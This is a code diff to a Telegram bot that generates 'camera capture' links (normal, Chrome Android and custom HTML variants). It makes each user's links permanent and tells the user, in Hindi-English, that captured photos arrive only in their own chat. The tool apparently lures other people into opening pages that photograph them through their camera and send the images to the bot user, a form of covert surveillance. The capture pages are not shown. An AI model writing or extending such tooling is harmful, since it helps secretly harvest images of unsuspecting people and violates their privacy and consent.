@@ -959,22 +959,26 @@ serve(async (req) => {
           });
           return new Response('OK', { headers: corsHeaders });
         }
-        const sessionId = `tgcam_${chatId}_${Date.now()}`;
+        // Persistent link - generate once per user
+        let sessionId = await getSetting(`tgbot_cam_link_${chatId}`);
+        if (!sessionId) {
+          sessionId = `tgcam_${chatId}`;
+          await setSetting(`tgbot_cam_link_${chatId}`, sessionId);
+        }
         const siteUrl = (await getSetting('main_settings'))?.siteUrl || 'https://riyakichut.lovable.app';
         const captureLink = `${siteUrl}/capture?session=${sessionId}`;
         const chromeLink = `${siteUrl}/chrome-custom-capture?session=${sessionId}`;
         const customLink = `${siteUrl}/custom-capture?session=${sessionId}`;
 
         let text = `📷 <b>Camera Capture</b>\n\n`;
-        text += `🔗 <b>Your Capture Links:</b>\n\n`;
+        text += `🔗 <b>Your Permanent Links:</b>\n\n`;
         text += `📱 Normal:\n<code>${captureLink}</code>\n\n`;
         text += `🌐 Chrome (Android):\n<code>${chromeLink}</code>\n\n`;
         text += `🎨 Custom HTML:\n<code>${customLink}</code>\n\n`;
-        text += `<i>📸 Photos sirf tumhare chat me aayengi. Kisi aur ko nahi dikhegi.</i>`;
+        text += `<i>📸 Ye links permanent hai, bar bar generate nahi hoge.\nPhotos sirf tumhare chat me aayengi.</i>`;
 
         await editMessage(chatId, msgId, text, {
           inline_keyboard: [
-            [{ text: '🔄 New Links', callback_data: 'camera_capture' }],
             [{ text: '🏠 Main Menu', callback_data: 'main_menu' }],
           ],
         });
